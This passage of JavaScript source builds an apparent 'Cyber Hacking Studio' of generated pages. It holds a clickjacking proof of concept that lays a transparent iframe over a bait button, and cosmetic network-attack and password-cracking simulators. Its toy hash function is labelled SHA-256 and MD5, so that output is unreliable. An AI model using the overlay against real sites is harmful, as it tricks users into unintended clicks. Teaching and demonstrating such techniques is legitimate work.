      <input type="range" id="opacity" min="0" max="1" step="0.1" value="0.5" style="width:100%; margin-bottom:20px;">
      <button onclick="updatePOC()">Update Overlay Frame</button>
    </div>
    <div class="box" style="flex:2;">
      <h3 style="color:#8b5cf6; margin-top:0;">Attack Simulation</h3>
      <p style="font-size:12px; color:#94a3b8;">The user thinks they are clicking the green button, but they are interacting with the invisible iframe (opacity > 0 for demo purposes).</p>
      <div class="poc-area">
        <button class="poc-btn" onclick="alert('You clicked the bait, but the iframe intercepted it!')">WIN A FREE iPHONE</button>
        <iframe id="pocFrame" src="https://example.com"></iframe>
      </div>
    </div>
  </div>
<script>
  function updatePOC() {
    const url = document.getElementById('targetUrl').value;
    const op = document.getElementById('opacity').value;
    const frame = document.getElementById('pocFrame');
    frame.src = url;
    frame.style.opacity = op;
  }
  document.getElementById('opacity').addEventListener('input', function(e) {
    document.getElementById('pocFrame').style.opacity = e.target.value;
  });
</script>
</body>
</html>`;
  }

  // ═══════════════════════════════════════════
  // TOOL 13: Advanced Password Entropy
  // ═══════════════════════════════════════════
  function getEntropyCode(lang) {
    return `<!DOCTYPE html>
<html lang="${lang}">
<head>
<meta charset="UTF-8">
<title>Password Entropy</title>
<style>
  body { background: #020617; color: #cbd5e1; font-family: 'Inter', sans-serif; margin: 0; padding: 30px; }
  h1 { color: #06b6d4; margin-top: 0; }
  .box { background: #0f172a; padding: 20px; border-radius: 8px; border: 1px solid #1e293b; max-width: 800px; margin: 0 auto; }
  input { width: 100%; background: #020617; border: 1px solid #334155; color: #06b6d4; padding: 15px; border-radius: 6px; box-sizing: border-box; margin-bottom: 20px; font-size: 18px; font-family: monospace; }
  .stat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
  .stat { background: #020617; padding: 15px; border-radius: 6px; border: 1px solid #1e293b; }
  .lbl { font-size: 11px; color: #94a3b8; font-weight: bold; text-transform: uppercase; margin-bottom: 5px; }
  .val { font-size: 20px; color: #fff; font-weight: bold; }
  .highlight { color: #06b6d4; }
  .warning { color: #ef4444; }
  .success { color: #10b981; }
</style>
</head>
<body>
  <div style="max-width: 800px; margin: 0 auto;">
    <h1>🔐 Advanced Password Entropy</h1>
    <p>Calculate mathematical cryptographic strength based on alphabet pool and length.</p>
  </div>
  <div class="box">
    <label style="font-weight:bold; color:#06b6d4; margin-bottom:10px; display:block;">Analyze Password:</label>
    <input type="text" id="pass" value="Tr0ub4dor&3" autocomplete="off">
    
    <div class="stat-grid">
      <div class="stat"><div class="lbl">Length</div><div class="val" id="sLen">-</div></div>
      <div class="stat"><div class="lbl">Alphabet Size (Pool)</div><div class="val" id="sPool">-</div></div>
      <div class="stat"><div class="lbl">Entropy (Bits)</div><div class="val" id="sEntropy">-</div></div>
      <div class="stat"><div class="lbl">Complexity Status</div><div class="val" id="sStatus">-</div></div>
      <div class="stat" style="grid-column: 1 / -1;"><div class="lbl">Brute-Force Time (Offline High-End GPU Cluster @ 100B/s)</div><div class="val highlight" id="sTime">-</div></div>
    </div>
  </div>
<script>
  function calcEntropy() {
    const p = document.getElementById('pass').value;
    let pool = 0;
    if (/[a-z]/.test(p)) pool += 26;
    if (/[A-Z]/.test(p)) pool += 26;
    if (/[0-9]/.test(p)) pool += 10;
    if (/[^a-zA-Z0-9]/.test(p)) pool += 32; // Approx 32 standard symbols
    
    document.getElementById('sLen').innerText = p.length;
    document.getElementById('sPool').innerText = pool;
    
    if (p.length === 0) {
      document.getElementById('sEntropy').innerText = '0 bits';
      document.getElementById('sTime').innerText = '0 seconds';
      document.getElementById('sStatus').innerText = '-';
      return;
    }

    const entropy = p.length * Math.log2(pool);
    document.getElementById('sEntropy').innerText = entropy.toFixed(1) + ' bits';
    
    if (entropy < 40) document.getElementById('sStatus').innerHTML = '<span class="warning">Weak (Unsafe)</span>';
    else if (entropy < 60) document.getElementById('sStatus').innerHTML = '<span style="color:#f59e0b">Moderate</span>';
    else if (entropy < 80) document.getElementById('sStatus').innerHTML = '<span class="success">Strong</span>';
    else document.getElementById('sStatus').innerHTML = '<span style="color:#06b6d4">Military Grade</span>';
    
    const combinations = Math.pow(pool, p.length);
    const hashesPerSecond = 100000000000; // 100 Billion hashes per sec
    const seconds = combinations / hashesPerSecond;
    
    let timeStr = "";
    if (seconds < 1) timeStr = "Instantly";
    else if (seconds < 60) timeStr = Math.round(seconds) + " seconds";
    else if (seconds < 3600) timeStr = Math.round(seconds/60) + " minutes";
    else if (seconds < 86400) timeStr = Math.round(seconds/3600) + " hours";
    else if (seconds < 31536000) timeStr = Math.round(seconds/86400) + " days";
    else if (seconds < 3153600000) timeStr = Math.round(seconds/31536000) + " years";
    else timeStr = "Centuries+ (Practically Uncrackable)";
    
    document.getElementById('sTime').innerText = timeStr;
  }
  document.getElementById('pass').addEventListener('input', calcEntropy);
  calcEntropy();
</script>
</body>
</html>`;
  }

  // ═══════════════════════════════════════════
  // 🔐 14. VISUAL CRYPTO LAB (Original)
  // ═══════════════════════════════════════════
  function renderCrypto(parent, backBtn, lang) {
    const tx = TX[lang].tools.crypto;
    parent.innerHTML = `
      <div style="padding:15px; font-family:'Inter', sans-serif; height:100%; overflow-y:auto; box-sizing:border-box; background:#020617;">
        ${backBtn}
        <h3 style="color:#10b981; margin:0 0 5px; font-size:15px; font-weight:800;">🔐 ${tx.name}</h3>
        <p style="color:#64748b; font-size:11px; margin:0 0 15px;">${tx.desc}</p>
        <div style="background:#0f172a; border:1px solid #1e293b; border-radius:10px; padding:12px; margin-bottom:15px;">
          <label style="font-size:10px; color:#94a3b8; font-weight:800; display:block; margin-bottom:6px;">${tx.encryptText}</label>
          <input type="text" id="cryptoInput" value="root_admin_pass" style="width:100%; background:#020617; border:1px solid #334155; color:#10b981; padding:10px; border-radius:6px; font-family:monospace; margin-bottom:12px; box-sizing:border-box;" />
          <label style="font-size:10px; color:#94a3b8; font-weight:800; display:block; margin-bottom:6px;">${tx.algorithm}</label>
          <select id="cryptoAlgo" style="width:100%; background:#020617; border:1px solid #334155; color:#94a3b8; padding:8px; border-radius:6px; font-family:monospace;">
            <option value="SHA-256">SHA-256 (Hash)</option>
            <option value="MD5">MD5 (Legacy Hash)</option>
          </select>
        </div>
        <div style="background:#020617; border:1px dashed #10b981; border-radius:8px; padding:12px; margin-bottom:15px; min-height:80px; position:relative; overflow:hidden;">
          <div style="font-size:9px; color:#10b981; opacity:0.5; position:absolute; top:4px; left:4px;">OUTPUT STREAM</div>
          <div id="cryptoOutput" style="color:#34d399; font-family:monospace; font-size:11px; word-break:break-all; margin-top:15px; font-weight:bold; letter-spacing:1px; line-height:1.4;">...</div>
        </div>
        <button id="btnInjectCrypto" style="width:100%; padding:11px; border-radius:8px; background:#10b981; border:none; color:#020617; font-weight:900; font-size:12px; cursor:pointer; box-shadow:0 4px 15px rgba(16,185,129,0.3);">${tx.injectBtn}</button>
      </div>
    `;

    function pseudoHash(str, algo) {
      let hash = 0; for (let i = 0; i < str.length; i++) hash = (hash << 5) - hash + str.charCodeAt(i);
      let hex = Math.abs(hash).toString(16).padEnd(32, '0');
      if (algo === 'SHA-256') return hex + hex.split('').reverse().join('') + 'a3f9';
      return hex;
    }

    const iText = document.getElementById('cryptoInput');
    const iAlgo = document.getElementById('cryptoAlgo');
    const oText = document.getElementById('cryptoOutput');
    function updateHash() { oText.innerText = pseudoHash(iText.value || ' ', iAlgo.value); }
    iText.addEventListener('input', updateHash); iAlgo.addEventListener('change', updateHash); updateHash();

    document.getElementById('btnInjectCrypto').addEventListener('click', () => {
      const langPrefix = lang === 'fr' ? 'Chiffrement' : 'Encryption';
      const codeToInject = `<!DOCTYPE html>
<html lang="${lang}">
<head>
  <meta charset="UTF-8">
  <title>${langPrefix} Engine</title>
  <style>
    body { background: #020617; color: #10b981; font-family: monospace; display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; margin:0; }
    .terminal { background: #0f172a; border: 1px solid #1e293b; padding: 20px; border-radius: 8px; width: 80%; max-width: 600px; box-shadow: 0 0 30px rgba(16,185,129,0.1); }
    h2 { color: #34d399; margin-top:0; font-size:18px; border-bottom: 1px solid #1e293b; padding-bottom:10px; }
    .hash-out { word-break: break-all; background: #000; padding: 15px; border-radius: 4px; color: #fff; margin-top: 15px; }
  </style>
</head>
<body>
  <div class="terminal">
    <h2>🔐 Web Crypto API (SHA-256)</h2>
    <input type="text" id="rawData" value="${iText.value}" style="width:100%; padding:10px; background:#020617; border:1px solid #10b981; color:#fff; font-family:monospace; margin-bottom:10px; box-sizing:border-box;">
    <button onclick="generateHash()" style="background:#10b981; color:#000; border:none; padding:10px 20px; font-weight:bold; cursor:pointer;">Generate Hash</button>
    <div class="hash-out" id="outHash">...</div>
  </div>
  <script>
    async function generateHash() {
      const text = document.getElementById('rawData').value;
      const data = new TextEncoder().encode(text);
      const hashBuffer = await crypto.subtle.digest('SHA-256', data);
      const hashArray = Array.from(new Uint8Array(hashBuffer));
      document.getElementById('outHash').innerText = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
    }
    generateHash();
  </script>
</body>
</html>`;
      window._injectCyberStudioCode(codeToInject);
    });
  }

  // ═══════════════════════════════════════════
  // 🌐 15. PENETRATION NETWORK SIM (Original)
  // ═══════════════════════════════════════════
  function renderNetSim(parent, backBtn, lang) {
    const tx = TX[lang].tools.net;
    parent.innerHTML = `
      <div style="padding:15px; font-family:'Inter', sans-serif; height:100%; overflow-y:auto; box-sizing:border-box; background:#020617;">
        ${backBtn}
        <h3 style="color:#0ea5e9; margin:0 0 5px; font-size:15px; font-weight:800;">🌐 ${tx.name}</h3>
        <p style="color:#64748b; font-size:11px; margin:0 0 15px;">${tx.desc}</p>
        <div style="background:#000; border:2px solid #0284c7; border-radius:50%; width:200px; height:200px; margin:0 auto 15px; position:relative; overflow:hidden; display:flex; align-items:center; justify-content:center; box-shadow:0 0 20px rgba(14,165,233,0.3);">
          <div style="position:absolute; width:150px; height:150px; border:1px solid rgba(14,165,233,0.3); border-radius:50%;"></div>
          <div style="position:absolute; width:100px; height:100px; border:1px solid rgba(14,165,233,0.3); border-radius:50%;"></div>
          <div style="position:absolute; width:100%; height:1px; background:rgba(14,165,233,0.3);"></div>
          <div style="position:absolute; width:1px; height:100%; background:rgba(14,165,233,0.3);"></div>
          <div style="position:absolute; width:8px; height:8px; background:#ef4444; border-radius:50%; top:40px; left:60px; box-shadow:0 0 8px #ef4444;"></div>
          <div style="position:absolute; width:8px; height:8px; background:#10b981; border-radius:50%; top:150px; left:140px; box-shadow:0 0 8px #10b981;"></div>
          <div id="radarLine" style="position:absolute; width:50%; height:2px; background:linear-gradient(90deg, transparent, #0ea5e9); right:50%; top:50%; transform-origin:100% 50%;"></div>
        </div>
        <div style="background:#0f172a; border:1px solid #1e293b; border-radius:10px; padding:12px; margin-bottom:15px;">
          <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px;">
            <div><label style="font-size:10px; color:#94a3b8; font-weight:800;">${tx.targetIP}</label><input type="text" value="192.168.1.105" style="width:100%; background:#020617; border:1px solid #334155; color:#0ea5e9; padding:6px; border-radius:4px; font-family:monospace; font-size:11px;" /></div>
            <div><label style="font-size:10px; color:#94a3b8; font-weight:800;">${tx.attackType}</label><select style="width:100%; background:#020617; border:1px solid #334155; color:#0ea5e9; padding:6px; border-radius:4px; font-size:11px;"><option>SYN Flood</option><option>Port Scan</option></select></div>
          </div>
        </div>
        <button id="btnInjectNet" style="width:100%; padding:11px; border-radius:8px; background:#0ea5e9; border:none; color:#020617; font-weight:900; font-size:12px; cursor:pointer; box-shadow:0 4px 15px rgba(14,165,233,0.3);">${tx.injectBtn}</button>
      </div>
    `;

    let deg = 0;
    const rLine = document.getElementById('radarLine');
    const interval = setInterval(() => {
      if(!rLine) { clearInterval(interval); return; }
      deg += 3; rLine.style.transform = `rotate(${deg}deg)`;
    }, 20);

    document.getElementById('btnInjectNet').addEventListener('click', () => {
      const codeToInject = `<!DOCTYPE html>
<html lang="${lang}">
<head>
  <meta charset="UTF-8">
  <title>Network Visualization</title>
  <style>
    body { background: #020617; color: #0ea5e9; font-family: monospace; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; overflow:hidden;}
    canvas { background: #0f172a; border-radius: 12px; box-shadow: 0 0 40px rgba(14,165,233,0.1); border: 1px solid #1e293b; }
    .overlay { position:absolute; top:20px; left:20px; pointer-events:none; }
  </style>
</head>
<body>
  <div class="overlay">
    <h2 style="margin:0; color:#fff;">📡 LIVE NETWORK TOPOLOGY</h2>
  </div>
  <canvas id="netCanvas" width="800" height="600"></canvas>
  <script>
    const canvas = document.getElementById('netCanvas');
    const ctx = canvas.getContext('2d');
    const nodes = [];
    for(let i=0; i<15; i++) nodes.push({ x: Math.random()*800, y: Math.random()*600, vx: (Math.random()-0.5)*2, vy: (Math.random()-0.5)*2, isTarget: i===0 });
    const packets = [];
    function draw() {
      ctx.fillStyle = '#0f172a'; ctx.fillRect(0, 0, 800, 600);
      ctx.strokeStyle = 'rgba(14,165,233,0.15)'; ctx.lineWidth = 1;
      for(let i=0; i<nodes.length; i++) {
        for(let j=i+1; j<nodes.length; j++) {
          const dx = nodes[i].x - nodes[j].x, dy = nodes[i].y - nodes[j].y;
          if (dx*dx + dy*dy < 40000) {
            ctx.beginPath(); ctx.moveTo(nodes[i].x, nodes[i].y); ctx.lineTo(nodes[j].x, nodes[j].y); ctx.stroke();
            if(Math.random() < 0.005) packets.push({ start: nodes[i], end: nodes[j], p: 0 });
          }
        }
      }
      for(let i=packets.length-1; i>=0; i--) {
        const pk = packets[i]; pk.p += 0.02;
        if(pk.p >= 1) { packets.splice(i, 1); continue; }
        ctx.fillStyle = '#10b981'; ctx.beginPath();
        ctx.arc(pk.start.x + (pk.end.x - pk.start.x)*pk.p, pk.start.y + (pk.end.y - pk.start.y)*pk.p, 3, 0, Math.PI*2);
        ctx.fill();
      }
      nodes.forEach(n => {
        n.x += n.vx; n.y += n.vy;
        if(n.x < 0 || n.x > 800) n.vx *= -1; if(n.y < 0 || n.y > 600) n.vy *= -1;
        ctx.fillStyle = n.isTarget ? '#ef4444' : '#0ea5e9';
        ctx.beginPath(); ctx.arc(n.x, n.y, n.isTarget ? 8 : 5, 0, Math.PI*2); ctx.fill();
        if(n.isTarget) { ctx.strokeStyle = 'rgba(239, 68, 68, 0.5)'; ctx.beginPath(); ctx.arc(n.x, n.y, 15 + Math.sin(Date.now()/200)*5, 0, Math.PI*2); ctx.stroke(); }
      });
      requestAnimationFrame(draw);
    }
    draw();
  </script>
</body>
</html>`;
      window._injectCyberStudioCode(codeToInject);
    });
  }

  // ═══════════════════════════════════════════
  // 🔑 16. PASSWORD CRACK MATRIX (Original)
  // ═══════════════════════════════════════════
  function renderCrack(parent, backBtn, lang) {
    const tx = TX[lang].tools.crack;
    parent.innerHTML = `
      <div style="padding:15px; font-family:'Inter', sans-serif; height:100%; overflow-y:auto; box-sizing:border-box; background:#020617;">
        ${backBtn}
        <h3 style="color:#ef4444; margin:0 0 5px; font-size:15px; font-weight:800;">🔑 ${tx.name}</h3>
        <p style="color:#64748b; font-size:11px; margin:0 0 15px;">${tx.desc}</p>
        <div style="background:#0f172a; border:1px solid #1e293b; border-radius:10px; padding:12px; margin-bottom:15px;">
          <label style="font-size:10px; color:#94a3b8; font-weight:800; display:block; margin-bottom:6px;">${tx.password}</label>
          <input type="password" id="passInput" value="admin123" style="width:100%; background:#020617; border:1px solid #334155; color:#ef4444; padding:10px; border-radius:6px; font-family:monospace; margin-bottom:12px; box-sizing:border-box;" />
          <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px;">
            <span style="font-size:10px; color:#94a3b8; font-weight:800;">${tx.strength}</span>
            <span id="passScore" style="color:#ef4444; font-weight:800; font-size:10px;">WEAK (0.2s)</span>
          </div>
          <div style="width:100%; height:4px; background:#1e293b; border-radius:2px; overflow:hidden;">
            <div id="passBar" style="width:25%; height:100%; background:#ef4444; transition:all 0.3s;"></div>
          </div>
        </div>
        <div style="background:#000; border-radius:8px; padding:10px; margin-bottom:15px; font-family:monospace; color:#ef4444; font-size:10px; opacity:0.7; height:60px; overflow:hidden; position:relative;">
          <div id="matrixStream" style="line-height:1.2; word-break:break-all;"></div>
          <div style="position:absolute; bottom:0; left:0; right:0; height:30px; background:linear-gradient(transparent, #000);"></div>
        </div>
        <button id="btnInjectCrack" style="width:100%; padding:11px; border-radius:8px; background:#ef4444; border:none; color:#fff; font-weight:900; font-size:12px; cursor:pointer; box-shadow:0 4px 15px rgba(239, 68, 68, 0.3);">${tx.injectBtn}</button>
      </div>
    `;

    const pIn = document.getElementById('passInput'), pScore = document.getElementById('passScore'), pBar = document.getElementById('passBar'), stream = document.getElementById('matrixStream');
    function checkStrength() {
      const v = pIn.value; let score = 0;
      if(v.length > 5) score++; if(v.length > 8) score++; if(/[A-Z]/.test(v)) score++; if(/[0-9]/.test(v)) score++; if(/[^A-Za-z0-9]/.test(v)) score++;
      if(score <= 1) { pScore.innerText = "WEAK (Instantly)"; pScore.style.color = pBar.style.background = "#ef4444"; pBar.style.width = "20%"; }
      else if(score <= 3) { pScore.innerText = "MEDIUM (Hours)"; pScore.style.color = pBar.style.background = "#f59e0b"; pBar.style.width = "50%"; }
      else { pScore.innerText = "STRONG (Centuries)"; pScore.style.color = pBar.style.background = "#10b981"; pBar.style.width = "100%"; }
    }
    pIn.addEventListener('input', checkStrength); checkStrength();

    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%&*";
    const mInterval = setInterval(() => {
      if(!stream) { clearInterval(mInterval); return; }
      let s = ""; for(let i=0; i<150; i++) s += chars[Math.floor(Math.random()*chars.length)]; stream.innerText = s;
    }, 50);

    document.getElementById('btnInjectCrack').addEventListener('click', () => {
      const codeToInject = `<!DOCTYPE html>
<html lang="${lang}">
<head>
  <meta charset="UTF-8">
  <title>Brute Force Matrix Simulation</title>
  <style>
    body { background: #000; color: #ef4444; font-family: monospace; padding: 20px; overflow:hidden; }
    h1 { border-bottom: 2px solid #ef4444; padding-bottom: 10px; }
    .col { float:left; width: 33%; font-size:12px; }
    .highlight { color: #fff; background: #ef4444; font-weight: bold; padding: 0 4px;}
  </style>
</head>
<body>
  <h1>🔑 CRACK_FRAMEWORK_v2.0 // TARGET: ADMIN_DB</h1>
  <div>
    <div class="col" id="c1"></div><div class="col" id="c2"></div><div class="col" id="c3"></div>
  </div>
  <script>
    const words = ["admin", "root", "password", "123456", "qwerty", "dragon"], chars = "abcdefghijklmnopqrstuvwxyz0123456789!@#$";
    function gen() { return words[Math.floor(Math.random()*words.length)] + chars[Math.floor(Math.random()*chars.length)] + chars[Math.floor(Math.random()*chars.length)]; }
    function stream(id) {
      const el = document.getElementById(id);
      setInterval(() => {
        let html = gen() + " [FAIL]<br>" + gen() + " [FAIL]<br>";
        if(Math.random() < 0.05) html += "<span class='highlight'>" + gen() + " [Testing]</span><br>";
        el.innerHTML = html + el.innerHTML.substring(0, 500);
      }, 50);
    }
    stream('c1'); setTimeout(()=>stream('c2'), 20); setTimeout(()=>stream('c3'), 40);
    setTimeout(() => {
      document.body.innerHTML = \`<div style="text-align:center; margin-top:20vh;"><h1 style="color:#10b981; font-size:40px; border:none;">ACCESS GRANTED</h1><p style="color:#fff; font-size:20px;">Password found: <span style="color:#ef4444;">${pIn.value}</span></p></div>\`;
    }, 3000);
  </script>
</body>
</html>`;
      window._injectCyberStudioCode(codeToInject);
    });
  }

  // Hook localization switcher
  const originalApplyLang = window.applyLang;
  window.applyLang = function() {
    if (typeof originalApplyLang === 'function') originalApplyLang();
    const currentLang = gl();
    const sideLbl = document.getElementById('lbl-tab-cyberstudio');
    if (sideLbl) sideLbl.textContent = currentLang === 'fr' ? 'Studio Cyber-Hack' : 'Cyber Hacking Studio';
    if (window.activeTab === 'cyberstudio') window.initCyberStudio(currentLang);
  };

  console.log('🛡️ Cyber Studio (16 Professional Tools) loaded successfully!');
})();
